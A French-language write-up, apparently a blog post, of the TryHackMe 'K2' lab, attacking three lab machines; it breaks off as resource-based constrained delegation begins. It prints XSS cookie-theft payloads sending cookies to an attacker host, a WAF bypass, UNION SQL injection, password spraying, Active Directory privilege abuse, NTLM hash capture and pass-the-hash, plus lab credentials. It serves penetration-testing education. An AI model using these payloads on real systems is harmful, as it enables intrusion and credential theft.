---
date: 2024-10-24T14:16:05-05:00
# description: ""
image: "/images/THM-K2/K2.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: K2"
type: "post"
---


* Platforme: TryHackMe
* Lien: [K2](https://tryhackme.com/r/room/k2room)
* Niveau: Difficile
* OS: Linux et Windows (Cette salle est composée de trois machines différentes)
---

# Base Camp

Base Camp est une machine Linux avec un serveur web. L'énumération initiale révèle deux sous-domaines liés à un système de ticketing, dont l'un est vulnérable au Cross-Site Scripting (XSS). En utilisant le XSS, nous dérobons un cookie de session pour accéder au tableau de bord de l'administrateur, qui lui-même est vulnérable à l'injection SQL. Cette faille nous permet de récupérer les informations d'identification des administrateurs, ce qui nous confère un accès initial. Pour l'escalade des privilèges, l'appartenance au groupe `adm` permet de lire les logs du système, où nous découvrons le mot de passe root.

## Balayage (Base Camp)

Utilisez l'adresse IP fournie et mettez à jour le fichier `/etc/hosts` avec `k2.thm`.

```
./nmap_scan.sh k2.thm K2
```

**Résultats**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 13:00 CDT
Nmap scan report for k2.thm (10.10.81.60)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 (RSA)
|   256 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f (ECDSA)
|_  256 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Dimension by HTML5 UP
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

Notre analyse révèle deux ports ouverts, 22 (SSH) et 80 (HTTP).

## What is the user flag?

### Enumération

À l'adresse `http://k2.thm`, nous trouvons le site web d'une entreprise qui fournit des services informatiques.

![K2 base camp website](/images/THM-K2/k2_tryhackme_website.png)

Les différentes pages n'offrent rien d'exploitable et la page de contact renvoie une erreur `HTTP 405`.

![K2 base camp 405 error](/images/THM-K2/HTTP-405.png)

Le listing des répertoires ne contient aucune information utile.

```
gobuster dir -u http://k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![K2 base camp gobuster cmd](/images/THM-K2/gobuster_k2.png)

En revanche, nous découvrons deux sous-domaines différents avec ffuf.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://k2.thm -H "Host: FUZZ.k2.thm" -ic -fs 13229
```

![K2 base camp subdomains](/images/THM-K2/k2_subdomains.png)

Il existe une page de connexion pour un système de ticketing à l'adresse `http://it.k2.thm/`.

![K2 base camp IT domain](/images/THM-K2/k2_it_subdomain.png)

Quelques répertoires sont trouvés par gobuster pour ce sous-domaine.

```
gobuster dir -u http://it.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![IT subdomain hidden directories](/images/THM-K2/it_subdomain_gobuster.png)

Le même système dispose d'une page de connexion pour l'administrateur à l'adresse `http://admin.k2.thm/`.

![Admin subdomain](/images/THM-K2/k2_admin_subdomain.png)

Ce sous-domaine a les mêmes répertoires sauf le`register`.

```
gobuster dir -u http://admin.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![Admin subdomain hidden directories](/images/THM-K2/subdomain_admin_gobuster.png)

Les tickets soumis à `http://it.k2.thm/` sont visibles à `http://admin.k2.thm/`.

Après la création d'un compte, nous soumettons quelques tickets mais il nous manque les identifiants pour accéder à la page d'administration. Puisque l'application accepte les données de l'utilisateur, testons les XSS.

Nous interceptons la requête après avoir soumis un ticket et la modifions. Nous utiliserons également deux payloads différents pour déterminer lequel des champs est vulnérable.

```
<script src="http://YOUR_IP:PORT_NUMBER/title.txt"></script>
<script src="http://YOUR_IP:PORT_NUMBER/description.txt"></script>
```

![XSS test](/images/THM-K2/XSS_test.png)

Après envoi de la requête, notre serveur web nous confirme que le champ `description` est vulnérable.

![XSS validated](/images/THM-K2/desc_vulneratble_XSS.png)

De plus, la requête contient un cookie de session et, après quelques recherches, nous apprenons que ni le drapeau `HttpOnly` ni le drapeau `Secure` ne sont activés sur ce cookie. Tous ces éléments indiquent la possibilité d'un vol de cookie.

![Cookie with no secure flags](/images/THM-K2/cookie_no_flags.png)

Nous utiliserons la payload ci-dessous.

```
<script>var i=new Image(); i.src="http://IP:PORT/?cookie="+btoa(document.cookie);</script>
```

![Cookie stealing via XSS](/images/THM-K2/cookie_stealing_XSS_payload.png)

Malheureusement pour nous, il est bloqué par le WAF (Web Application Firewall).

![WAF message](/images/THM-K2/WAF_message.png)

Après plusieurs tentatives, nous parvenons à contourner le WAF en utilisant la concaténation de chaînes.

```
<script>var i=new Image(); var c = "do" + "cument" + "." + "cookie"; i.src="http://YOUR_IP:PORT_NUMBER/?cookie="+btoa(eval(c));</script>
```

![WAF bypass payload](/images/THM-K2/XSS_payload_bypass_WAF.png)

Sur notre serveur web, nous recevons la valeur du cookie, que nous décodons avec la commande ci-dessous.

```
echo "CCOKIE_VALUE" | base64 -d
```

![base64 cookie value](/images/THM-K2/cookie_value_base64.png)

Après l'avoir utilisé sur le sous-domaine `admin` et avoir rafraîchi la page, nous avons maintenant accès au tableau de bord à `http://admin.k2.thm/dashboard` où nous trouvons trois tickets.

> Nous ne sommes pas automatiquement redirigés vers le tableau de bord de l'administrateur et devons nous rendre nous-mêmes sur `http://admin.k2.thm/dashboard`.

![Admin dashboard access](/images/THM-K2/admin_dashboard_access.png)

Nous pouvons filtrer les tickets sur la base du titre que nous fournissons. Il est raisonnable de supposer qu'ils sont stockés dans une base de données. La prochaine étape consiste donc à tenter une injection SQL.

Nous interceptons la requête et ne remarquons qu'un seul paramètre (`title`).

![Admin dashboard request](/images/THM-K2/admin_dashboard_request.png)

Le remplacement de la valeur de `title` par `'` (guillemet simple) entraîne une erreur 500, ce qui est souvent le signe d'une possibilité d'injection SQL.

![SQLi test K2 basecamp](/images/THM-K2/k2_SQLi_test.png)

Stockons la requête dans un fichier et utilisons-le avec SQLmap.

```
sqlmap -r request.txt
```

![SQLmap exploitation](/images/THM-K2/sqli_blocked.png)

Une fois de plus, le WAF bloque notre exploitation, exactement comme il l'a fait pour l'attaque XSS. Il est probablement possible de contourner le problème avec SQLmap, mais c'est au-dessus de mes compétences pour le moment. Cependant, nous pouvons essayer de l'exploiter manuellement.

Nous disposons [ici](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/detect/Generic_SQLI.txt) d'une pléthore de payloads SQLi que nous pouvons utiliser avec la fonction `Intruder` de Burp Suite.

![Burp Intruder SQLi](/images/THM-K2/Intruder_burp.png)

Dans la sous-section `Payloads` nous collons la liste que nous avons obtenue de Github, et pour `Payload processing` nous utilisons `URL encoded all the characters`.

![Burp Intruder SQLi settings](/images/THM-K2/intruder_payload_settings.png)

Comme je m'y attendais, ils sont tous bloqués par le WAF, encore une fois.

![SQLI payloads blocked with Intruder](/images/THM-K2/SQLi_payloads_blocked.png)

Jusqu'à présent, nous avons utilisé des payloads SQLi simples/génériques. Reprenons à partir du `'` que nous avons utilisé plus tôt et partons de là. Cette fois-ci, nous allons tenter des attaques de type UNION.

Tout d'abord, pour connaître le nombre de colonnes, nous allons envoyer quelques payloads avec `Intruder` et voir à quel moment nous n'obtenons pas d'erreur.

```SQL
' UNION SELECT NULL; --
' UNION SELECT NULL, NULL; --
' UNION SELECT NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL; --
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL; --
```

![Union SQLi payloads](/images/THM-K2/UNION_SQLi_payloads.png)

Après avoir exécuté notre attaque, nous constatons que `' UNION SELECT NULL, NULL, NULL ; --` fonctionne, ce qui signifie que trois colonnes sont escomptées.

![Union SQLi successful payload](/images/THM-K2/UNION_SQLi_working_payload.png)

Exécutons un test et essayons de trouver la version de la base de données.

```SQL
' UNION SELECT NULL, NULL, @@VERSION; --
```

![SQLi db version](/images/THM-K2/SQLi_db_version.png)

Nous réussissons et trouvons la version `8.0.33-0ubuntu0.20.04.2`. Ensuite, nous devons déterminer la base de données dans laquelle nous nous trouvons.

```SQL
' UNION SELECT NULL, NULL, database(); --
```

Nous sommes dans la base de données `Ticket Review`.

![Ticket review database](/images/THM-K2/Ticket_review_db.png)

Listons maintenant les noms de toutes les tables de cette base de données.

```SQL
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = database(); --
```

Nous découvrons trois tables! `admin_auth`, `auth_users`, et `tickets`.

![Tables list in Ticket Reviiew DB](/images/THM-K2/tables_list_k2.png)

Examinons le contenu de `admin_auth`.

```SQL
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name = 'admin_auth'; -- 
```

Nous trouvons quatre colonnes dans la table `admin_auth` qui sont : `id`, `admin_username`, `admin_password`, et `email`.

![admin_auth columns](/images/THM-K2/admin_auth_columns.png)

Nous pouvons maintenant récupérer les informations d'identification avec `admin_username` et `admin_password`.

```SQL
' UNION SELECT NULL, admin_username, admin_password FROM admin_auth; --
```

Nous obtenons plusieurs identifiants d'administrateur, les premiers étant : `james:Pwd@9tLNrC3!`.

```
james:Pwd@9tLNrC3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```

![admin credentials](/images/THM-K2/SQLi_admin_creds.png)

### Accès initial (shell en tant que james)

Avec `james:Pwd@9tLNrC3!` nous pouvons nous connecter via SSH et lire le drapeau utilisateur.

![user flag for K2-basecamp](/images/THM-K2/user_flag_basecamp_k2.png)

## What is the root flag?

Nos tentatives de connexion avec les autres identifiants échouent. Après avoir lancé `id`, nous remarquons que `james` fait partie du groupe `adm`.

![adm group membership](/images/THM-K2/adm_group.png)

Sur cette [page HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#lxc-lxd-group), nous apprenons que les membres du groupe `adm` ont généralement les permissions pour lire les fichiers log situés dans /var/log/.

![adm group info](/images/THM-K2/adm_group_info.png)

Pour analyser cette montagne de données, nous utilisons une commande grep.

```
grep -ir "password"
```

Dans `nginx/access.log.1` nous trouvons une tentative de connexion de l'utilisateur `rose` avec le mot de passe `RdzQ7MSKt)fNaz3!`.

![Rose password](/images/THM-K2/rose_pwd.png)

Mais l'utilisation de ce mot de passe avec `su rose` échoue!

![switch to user rose failure](/images/THM-K2/su_rose_failure.png)

### Elévation de Privilèges

Essayons ce mot de passe avec tous les utilisateurs du système.

```
hydra -L k2_users.txt -p 'RdzQ7MSKt)fNaz3!' ssh://k2.thm
```

Il s'avère que ce mot de passe appartient au compte root.

![root account credentials](/images/THM-K2/ssh_root_creds.png)

Avec `root:RdzQ7MSKt)fNaz3!` nous nous connectons via SSH et récupérons le drapeau root.

![root flag for K2-basecamp](/images/THM-K2/root_flag_basecamp_k2.png)


## What are the usernames and passwords that had access to the server?

Les noms d'utilisateurs que nous avons trouvés dans `/etc/passwd` et leurs mots de passe respectifs sont ci-dessous.

```
james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8
```

## Two users have their full names on display. What are their names?

Avec `/etc/passwd`

![users full names](/images/THM-K2/users_full_names.png)

`James Bold, Rose Bud`.

Nous pouvons maintenant passer à la machine suivante, Middle Camp.

# Middle Camp

Middle Camp est un contrôleur de domaine sans serveur web. En utilisant les données de la machine précédente, nous accédons au système via RPC. Sur la cible, il y a une note qui révèle partiellement le mot de passe d'un utilisateur, en utilisant un script Bash, nous récupérons le mot de passe complet. Avec Bloodhound, nous identifions un groupe avec des permissions `GenericAll` sur un autre compte, ce qui nous permet de changer le mot de passe de ce compte et de nous déplacer latéralement. Le nouvel utilisateur, membre de `Backup Operators`, nous permet de lire le drapeau root, et nous utilisons `SeBackupPrivilege` pour accéder aux ruches du registre afin de récupérer le hash de l'administrateur.

## Balayage (Middle Camp)

Mettez à jour le fichier `/etc/hosts` avec l'adresse IP de la nouvelle machine pour `k2.thm`, et scannez-la.

```
sudo nmap -sC -sV -oA nmap/k2_MC k2.thm
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 11:38 CDT
Nmap scan report for k2.thm (10.10.70.233)
Host is up (0.19s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-16 16:38:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-10-16T16:39:27+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=K2Server.k2.thm
| Not valid before: 2024-10-15T16:07:29
|_Not valid after:  2025-04-16T16:07:29
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2SERVER
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2Server.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-16T16:38:47+00:00
Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-16T16:38:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.21 seconds
```

Nous avons cette fois affaire à un contrôleur de domaine et il n'y a pas de serveur web.

Nous notons le nom de l'ordinateur `K2Server.k2.thm` que nous ajoutons au fichier `/etc/hosts`.

## What is the user flag?

### Enumération

Grâce l'exploitation de la machine précédente, nous savons que les utilisateurs ayant accès au serveur sont `James Bold` et `Rose Bud`. Puisque nous sommes dans un environnement AD (Active Directory), essayons de trouver des noms d'utilisateur de domaine valides. Ils suivent généralement un certain schéma, voici donc une liste de noms d'utilisateur AD possibles.

```
James
Rose
James Bold
Rose Bud
j.bold
james.bold
bold.j
r.bud
rose.bud
bud.r
```

> Il est facile de créer des combinaisons pour deux utilisateurs. Si vous en avez plus, vous pouvez utiliser un outil comme [username-anarchy](https://github.com/urbanadventurer/username-anarchy).

Nous créons également une liste de tous les mots de passe dont nous disposons actuellement.

```
Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
```

#### Méthode NetExec

Avec la liste des utilisateurs potentiels et la liste des mots de passe de la machine précédente, nous pouvons énumérer les utilisateurs.

```
netexec smb K2Server.k2.thm -u potential_AD_users.txt -p found_pwds.txt
```

![netexec AD enumeration](/images/THM-K2/valid_creds_k2AD.png)

Les identifiants `r.bud:vRMkaVgdfxhW!8` sont valides !

> L'utilisation de netexec pour l'énumération AD **ne fonctionnera pas si l'authentification nulle est désactivée** parce que nous aurons besoin de fournir des informations d'identification valides (nom d'utilisateur et mot de passe) pour s'authentifier auprès des services SMB.

#### Méthode Kerbrute

Kerbrute peut également être utilisé pour trouver les noms d'utilisateur valides.

```
./kerbrute userenum --dc K2Server.k2.thm -d k2.thm potential_AD_users.txt 
```

![kerbrute AD enumeration](/images/THM-K2/k2_valid_AD_usernames.png)

Nous pouvons ensuite utiliser les mots de passe trouvés contre les utilisateurs.

```
./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt j.bold

./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt r.bud
```

![kerbrute credentials brute forcing](/images/THM-K2/rose_bud_kerbrute.png)

> Kerbrute fonctionnera indépendamment du fait que l'authentification nulle soit activée ou désactivée. Il est conçu pour trouver des informations d'identification valides par rapport à un service d'authentification **Kerberos**.

## Accès initial (shell en tant que rose)

Avec les identifiants valides, nous nous connectons avec evil-winrm.

```
evil-winrm -i k2.thm -u r.bud -p "vRMkaVgdfxhW\!8"
```

![K2-Middle Camp foothold](/images/THM-K2/foothold_k2MC.png)

Dans `C:\Users\r.bud\Documents` nous trouvons deux fichiers texte: `notes.txt` et `note_to_james.txt`.

![notes content](/images/THM-K2/rbud_notes_content.png)

Il s'agit d'un échange concernant la conformité d'un mot de passe. James a ajouté deux caractères à son mot de passe précédent, qui était `rockyou`, afin de répondre aux critères.

Nous savons donc que le mot de passe de James comporte **9** caractères et inclut `rockyou`, un caractère spécial et un chiffre.

Utilisons un script Bash pour générer quelques mots de passe.

```bash
#!/bin/bash

special_characters=('!' '@' '#' '$' '%' '^' '&' '*')
numbers=(0 1 2 3 4 5 6 7 8 9)

output_file="james_passwords.txt"

> "$output_file"

for special in "${special_characters[@]}"; do
    for number in "${numbers[@]}"; do
    
        echo "${special}${number}rockyou" >> "$output_file"
        
        echo "${number}${special}rockyou" >> "$output_file"
        
        echo "rockyou${number}${special}" >> "$output_file"
        
        echo "rockyou${special}${number}" >> "$output_file"
    done
done

echo "Password list generated in $output_file"
```

Nous utilisons cette liste contre le nom d'utilisateur valide `j.bold`.

```
./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm james_passwords.txt j.bold
```

![j.bold credentials found](/images/THM-K2/jbold_pwd_found.png)

Nous trouvons les identifiants valides `j.bold:#8rockyou`. Cependant, nous ne pouvons pas nous connecter via evil-winrm avec James car son `Remote Access` a été supprimé.

Nous pouvons le confirmer avec les résultats de `net user r.bud` et `net user j.bold`. Rose Bud fait partie du groupe `Remote Management Use`.

![rose group memberships](/images/THM-K2/rosebud_remote_access.png)

Mais James Bold ne l'est pas.

![j.bold group memberships](/images/THM-K2/jbold_no_remote_access.png)

Lançons Bloodhound avec les données d'identification de Rose Bud.

```
bloodhound-python -c all -u r.bud -p 'vRMkaVgdfxhW!8' -d k2.thm -dc K2Server.k2.thm -ns 10.10.70.233
```

![bloodhound-python command](/images/THM-K2/rose_bud_bloodhound_py.png)

Démarrer la base de données

```
sudo neo4j start
```

Lancer Bloodhound

```
bloodhound --no-sandbox
```

Dans la section `Analysis`, nous sélectionnons `Find Shortest Paths to Domain Admins`.

Nous découvrons que les membres de `IT STAFF 1` (dont James fait partie) ont la permission `GenericAll` sur `J.SMITH`.

![IT STAFF 1 members - GenericAll permission](/images/THM-K2/jbold_GenericAll.png)

Nous faisons un clic droit sur le thread `GenericAll`, sélectionnons `Help` et sous `Linux Abuse` nous lisons que nous pouvons changer le mot de passe de l'utilisateur.

![ForceChangePassword command](/images/THM-K2/ForceChangePassword.png)

```
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

![jsmith password change](/images/THM-K2/jsmith_pwd_change.png)

### Mouvement latéral (shell en tant que j.smith)

Nous nous connectons ensuite avec evil-winrm et récupérons le drapeau de utilisateur sur le bureau.

```
evil-winrm -i k2.thm -u j.smith -p "Paswword#@2024"
```

![jsmith login](/images/THM-K2/jsmith_login.png)

## What are the usernames found on the server?

Les noms d'utilisateur trouvés sont les suivants:

```
j.bold,j.smith,r.bud
```

## What is the root flag?

De retour sur Bloodhound, nous constatons que `J.SMITH` fait partie du groupe `Backup Operators`.

![jsmith Backup Operators membership](/images/THM-K2/JSMITH_backup_operators.png)

![Backup Operators group info](/images/THM-K2/Backup_Operators_AD_info.png)
_[Source](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators)_

Sur [cette page](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators) HackTricks, nous trouvons deux méthodes différentes pour abuser de l'appartenance au groupe `Backup Operators`. La première méthode `Local Attack` nous aidera à obtenir le drapeau root.

1. Nous devons transférer deux fichiers dll nécessaires : `SeBackupPrivilegeUtils.dll` et `SeBackupPrivilegeCmdLets.dll`. Ils sont disponibles sur [ce répertoire Github](https://github.com/giuliano108/SeBackupPrivilege).

Après avoir cloné le répertoire, nous transférons les fichiers vers la cible via notre shell evil-winrm.

```
upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
```

![DLL file uploads](/images/THM-K2/DLLs_uploads.png)

2. Importez les bibliothèques

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

![Import DLL](/images/THM-K2/Import_DLLs.png)

3. Nous pouvons maintenant copier des fichiers situés dans des répertoires restreints

```
cd C:\Users\Administrator\

Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\j.smith\Documents\root.txt -Overwrite
```

4. Avec les commandes ci-dessus, nous copierons le drapeau root dans `C:\Users\j.smith\Documents`

![Read Rood flag](/images/THM-K2/root_flag_k2MC.png)


## What is the Administrator's NTLM hash?

### Elévation de Privilèges

![SeBackUpPriv](/images/THM-K2/SeBackUpPriv.png)

Grâce au privilège `SeBackupPrivilege`, nous pouvons obtenir des copies des ruches SAM et SYSTEM.

![SeBackUpPriv information](/images/THM-K2/SeBackupPrivilege_info.png)
_[Source](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)_

```
reg save hklm\sam C:\Windows\Temp\SAM

reg save hklm\system C:\Windows\Temp\SYSTEM
```

![reghives copy](/images/THM-K2/reghives_copy.png)

Nous transférons ensuite les ruches sur notre machine locale.

```
download C:\Windows\Temp\SAM

download C:\Windows\Temp\SYSTEM
```

Avec `impacket`, nous pouvons extraire les hashs en utilisant les ruches que nous avons téléchargées.

```
impacket-secretsdump -sam SAM -system SYSTEM local
```

![Admin hash](/images/THM-K2/Admin_hash.png)

En utilisant le hash de l'utilisateur `Administrator`, nous nous connectons avec evil-winrm.

```
evil-winrm -i k2.thm -u Administrator -H "9545b61858c043477c350ae86c37b32f"
```

De plus, nous pouvons récupérer le mot de passe de l'administrateur avec netexec.

```
netexec smb k2.thm -u Administrator -H "9545b61858c043477c350ae86c37b32f" --dpapi
```

![Admin password](/images/THM-K2/admin_pwd.png)

Les identifiants admin sont `Administrator:vz0q$i8b4c`.

Nous passons ensuite à la dernière machine de cette salle, The Summit.

# The Summit

The Summit, la dernière machine de la salle K2, est également un contrôleur de domaine. Grâce à l'énumération de l'Active Directory, nous découvrons des informations d'identification valides, nous permettant d'obtenir un accès initial. Nous exploitons ensuite des mauvaises permissions liées à un fichier `.bat` pour obtenir le hash du mot de passe du propriétaire du fichier, qui, une fois craqué, nous donne accès à ce compte. Bloodhound révèle que cet utilisateur fait partie d'un groupe disposant de l'autorisation `GenericWrite` sur le contrôleur de domaine, et en abusant de cette autorisation nous effectuons une délégation restreinte basée sur les ressources (Resource-Based Constrained Delegation, RBCD). Grâce à cette technique, nous récupérons le hash `Administrator` et le drapeau root.

## Balayage (The Summit)

Mettez à jour `/etc/hosts` et scannez la cible.

```
sudo nmap -sC -sV -oA nmap/k2_Summit k2.thm
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 16:56 CDT
Nmap scan report for k2.thm (10.10.124.173)
Host is up (0.19s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-16 21:57:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2ROOTDC
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2RootDC.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-16T21:57:30+00:00
|_ssl-date: 2024-10-16T21:58:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=K2RootDC.k2.thm
| Not valid before: 2024-10-15T21:52:04
|_Not valid after:  2025-04-16T21:52:04
Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-16T21:57:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.09 seconds
```

La dernière machine est un autre contrôleur de domaine avec le nom `K2RootDC.k2.thm`.

## What is the user flag?

### Enumération

Nous mettons à jour nos listes avant de commencer à énumérer Active Directory.

**Noms d'utilisateur AD possibles**

```
j.bold
j.smith
r.bud
administrator
```

**Mots de passe trouvés**

```
Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
#8rockyou
vz0q$i8b4c
```
Utilisons`Kerbrute` pour trouver les noms d'utilisateurs valides.

![K2-The Summit AD enumeration](/images/THM-K2/valid_users_k2S.png)

Une fois de plus, nous comparons nos mots de passe aux utilisateurs valides.

```
kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt j.smith

kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt administrator
```

![JSMITH valid credentials](/images/THM-K2/JSMITH_valid_creds.png)

Nous trouvons les identifiants valides : `j.smith:vz0q$i8b4c`. (Il s'agit du mot de passe administrateur de la machine Middle Camp).

### Accès initial (shell en tant que j.smith)

Nous nous connectons avec evil-winrm en tant que `j.smith` mais le drapeau utilisateur n'est pas sur ce compte. Aucun des différents répertoires de cet utilisateur ne contient des informations intéressantes.

```
evil-winrm -i k2.thm -u j.smith -p "vz0q$i8b4c"
```

![JSMITH login](/images/THM-K2/k2_Summit_JSMITH_login.png)

Dans `C:\Scripts` nous trouvons un fichier appelé `backup.bat`. Il exécute la commande suivante

```
copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
```

![Bat file content](/images/THM-K2/bat_file.png)

En vérifiant les permissions sur le fichier et son répertoire parent, nous découvrons que `j.smith`, l'utilisateur que nous contrôlons actuellement, a le contrôle total sur `C:/Scripts`.

```
Get-Acl -Path "C:\Scripts\backup.bat"

Get-Acl -Path "C:\Scripts"
```

![File permissions](/images/THM-K2/file_permissions.png)

Nous pouvons exploiter cette permission et obtenir le hash de `o.armstrong`.

1. Lancez Responder pour capturer le hash

```
sudo responder -I tun0
```

2. Supprimez le fichier `backup.bat` existant et créez-en un autre du même nom avec un contenu différent

```
rm backup.bat

Set-Content -Path "C:\Scripts\backup.bat" -Value 'copy \\YOUR_IP\share\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt'
```

![Malicious bat file](/images/THM-K2/backup_file_replace.png)

Après un peu de temps, nous obtenons le hash sur Responder.

![o.arnstrong hash](/images/THM-K2/o_amstrong_hash.png)

Nous le craquons avec hashcat et récupérons le mot de passe `arMStronG08`.

```
hashcat -a 0 -m 5600 oamstrong_hash.txt /usr/share/wordlists/rockyou.txt
```

![o.arnstrong hash cracked](/images/THM-K2/oamstrong_hash_cracked.png)

### Mouvement latéral (shell en tant que o.armstrong)

En utilisant evil-winrm, nous nous connectons en tant que `o.armstrong` et trouvons le drapeau utilisateur.

![o.arnstrong login](/images/THM-K2/oarmstrong_login.png)

Le fichier `notes.txt` est une liste de tâches à accomplir.

![o.arnstrong notes.txt file](/images/THM-K2/k2_summit_notes_file.png)

## What is the root flag?

### Elévation de Privilèges

Exécutons Bloodhound afin de trouver des pistes d'escalade de privilèges.

```
bloodhound-python -c all -u j.smith -p 'vz0q$i8b4c' -d k2.thm -dc K2RootDC.k2.thm -ns 10.10.124.173
```

Démarrez la base de données et lancez Bloodhound.

```
sudo neo4j start

bloodhound --no-sandbox
```

`o.armstrong` fait partie du groupe `IT DIRECTOR` et ses membres ont la permission `GenericWrite` sur le DC. Nous pouvons l'exploiter via la délégation contrainte basée sur les ressources (RBCD).

